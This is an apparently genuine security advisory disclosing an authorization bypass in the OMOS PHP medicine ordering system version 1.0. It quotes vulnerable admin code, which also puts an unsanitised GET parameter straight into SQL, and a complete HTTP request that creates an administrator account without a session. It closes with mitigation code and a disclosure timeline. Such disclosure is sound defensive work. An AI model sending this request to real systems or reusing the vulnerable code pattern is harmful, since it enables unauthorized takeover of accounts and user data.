# Unauthorized Admin Operations (Authorization Bypass Vulnerability) in OMOS - Open Source Medicine Ordering System


## Information

- **Exploit Author:** This vulnerability was discovered and reported by Bünyamin Demir from Enforsec A. Ş.
- **Vendor Homepage:** https://www.sourcecodester.com/php/15359/online-medicine-ordering-system-phpoop-free-source-code.html
- **Software Link:** https://www.sourcecodester.com/download-code?nid=15359&title=Online+Medicine+Ordering+System+in+PHP%2FOOP+Free+Source+Code
- **Version:** 1.0
- **Tested on:** PHP/7.4.33 + LiteSpeed
- **CVE:** Not Yet Assigned
- **Exploit:** https://github.com/bunyamindemir/vulnerability-disclosures/blob/main/omos_authorization_bypass.py

## Introduction

In the OMOS application, there is a lack of authorization checks for admin-specific operations. Specifically, an attacker can perform admin-level actions (such as adding a new user) without possessing a valid session token. The application does not verify whether the user is logged in as an admin or even check for a session token at all.

## Impact

An attacker exploiting this vulnerability can:

* Create a new admin user without authorization.
* Log in as an admin and access sensitive user information.
* Modify page content and potentially take over other user accounts.

Immediate remediation is recommended.

## Technical Details

During our analysis, we identified several instances of Authorization Bypass vulnerabilities, examples of which were detailed in the provided documentation. 

| id   | Vulnerable EndPoint                                                         |
| ---- | ------------------------------------------------------------------------- |
| 1    | /admin/user/manage_user.php                                                                     |


As part of our comprehensive security assessment, we have identified specific instances of code within the OMOS application that are vulnerable to Authorization Bypass attacks. To illustrate the nature and potential impact of these vulnerabilities, we have documented representative samples of the vulnerable code segments alongside corresponding example HTTP Requests that demonstrate how these vulnerabilities can be exploited.

Vulnerable code sample and example HTTP Requests are as follows.

**File name 1:** /admin/user/manage_user.php

**Description 1:** This function is intended exclusively for admin users. However due to the lack of session verification within the application, we have identified that attackers can exploit this endpoint to add users with administrator privileges.

**Vulnerable code 1:**

```php
<?php 
if(isset($_GET['id'])){
    $user = $conn->query("SELECT * FROM users where id ='{$_GET['id']}' ");
    foreach($user->fetch_array() as $k =>$v){
        $meta[$k] = $v;
    }
}
?>
...
<div class="card card-outline rounded-0 card-danger">
	<div class="card-body">
		<div class="container-fluid">
			<div id="msg"></div>
			<form action="" id="manage-user">	
				<input type="hidden" name="id" value="<?= isset($meta['id']) ? $meta['id'] : '' ?>">
				...
				<div class="form-group">
					<label for="username">Username</label>
					<input type="text" name="username" id="username" class="form-control" value="<?php echo isset($meta['username']) ? $meta['username']: '' ?>" required  autocomplete="off">
				</div>
				<div class="form-group">
					<label for="password"><?= isset($meta['id']) ? "New" : "" ?> Password</label>
					<input type="password" name="password" id="password" class="form-control" value="" autocomplete="off">
                    <?php if(isset($meta['id'])): ?>
					<small><i>Leave this blank if you dont want to change the password.</i></small>
                    <?php endif; ?>
				</div>
				...
		</div>
	</div>
	<div class="card-footer">
			<div class="col-md-12">
				<div class="row">
					<button class="btn btn-sm btn-primary rounded-0 mr-3" form="manage-user">Save User Details</button>
					<a href="./?page=user/list" class="btn btn-sm btn-default border rounded-0" form="manage-user"><i class="fa fa-angle-left"></i> Cancel</a>
				</div>
			</div>
		</div>
</div>
<style>
	img#cimg{
		height: 15vh;
		width: 15vh;
		object-fit: cover;
		border-radius: 100% 100%;
	}
</style>
<script>
...
	$('#manage-user').submit(function(e){
		e.preventDefault();
		start_loader()
		$.ajax({
			url:_base_url_+'classes/Users.php?f=save',
			data: new FormData($(this)[0]),
		    cache: false,
		    contentType: false,
		    processData: false,
		    method: 'POST',
		    type: 'POST',
			success:function(resp){
				if(resp ==1){
					location.href='./?page=user/list'
				}else{
					$('#msg').html('<div class="alert alert-danger">Username already exist</div>')
					end_loader()
				}
			}
		})
	})
</script>
```

**Sample HTTP request to add administrator user without a valid session: **

```http
POST /omos/classes/Users.php?f=save HTTP/1.1
Host: 192.168.1.34
Content-Length: 918
Accept: */*
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoOEMSDR2FaOMcV6q
Origin: http://192.168.1.34
Referer: http://192.168.1.34/omos/admin/?page=user/manage_user
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryoOEMSDR2FaOMcV6q
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryoOEMSDR2FaOMcV6q
Content-Disposition: form-data; name="firstname"

EnforsecName2
------WebKitFormBoundaryoOEMSDR2FaOMcV6q
Content-Disposition: form-data; name="middlename"

EnforsecMiddleName2
------WebKitFormBoundaryoOEMSDR2FaOMcV6q
Content-Disposition: form-data; name="lastname"

EnforsecLastName2
------WebKitFormBoundaryoOEMSDR2FaOMcV6q
Content-Disposition: form-data; name="username"

enforsec_admin2
------WebKitFormBoundaryoOEMSDR2FaOMcV6q
Content-Disposition: form-data; name="password"

test1234
------WebKitFormBoundaryoOEMSDR2FaOMcV6q
Content-Disposition: form-data; name="type"

1
------WebKitFormBoundaryoOEMSDR2FaOMcV6q
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryoOEMSDR2FaOMcV6q--
```

## Affected Versions

Version 1.0 is known to be vulnerable.

## Mitigation

To mitigate this vulnerability, the following steps should be taken:

**Session Management:** Ensure that every admin operation requires a valid session token.

**Authorization Checks:** Implement strict authorization checks to verify if the user has admin privileges before allowing admin-specific operations.

The following example code demonstrates secure session authentication. By adapting this code to the application, secure session validation can be implemented.

```php
?php
session_start();

// Session check
if (!isset($_SESSION['user_id'])) {
    // If the user is not logged in, show unauthorized access message
    http_response_code(403); // Forbidden
    echo "Unauthorized access: Please log in.";
    exit();
}

// Check user authorization
$user_id = $_SESSION['user_id'];

// Database connection
$conn = new mysqli("localhost", "username", "password", "database");

// Check the database connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Query to check user role
$sql = "SELECT role FROM users WHERE id = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 0) {
    // If the user is not found, show unauthorized access message
    http_response_code(403); // Forbidden
    echo "Unauthorized access: User not found.";
    exit();
}

$row = $result->fetch_assoc();
$user_role = $row['role'];

if ($user_role !== 'admin') {
    // If the user is not an admin, show unauthorized access message
    http_response_code(403); // Forbidden
    echo "Unauthorized access: Admin privileges required.";
    exit();
}

// Proceed with the operation after admin privilege is confirmed
...
?>
```

Given the critical nature of these findings, we strongly recommend undertaking a thorough review and remediation process to address these and any other similar vulnerabilities within the application. 

## References

- OWASP Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- Similar Vulnerabilites in OMOS Product
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-28303
  - https://nvd.nist.gov/vuln/detail/CVE-2024-25217
  - https://www.cve.org/CVERecord?id=CVE-2022-3714

## Contact Information

For further information or inquiries about this vulnerability analysis, please contact bunyamin.demir@enforsec.com.

## Disclosure Timeline

- **Discovered on:** Wed, 28 Aug 2024
- **CVE ID Requested on:** Wed, 28 Aug 2024
- **CVE ID Assigned on:** waiting
- **Advisory Published on:** Wed, 28 Aug 2024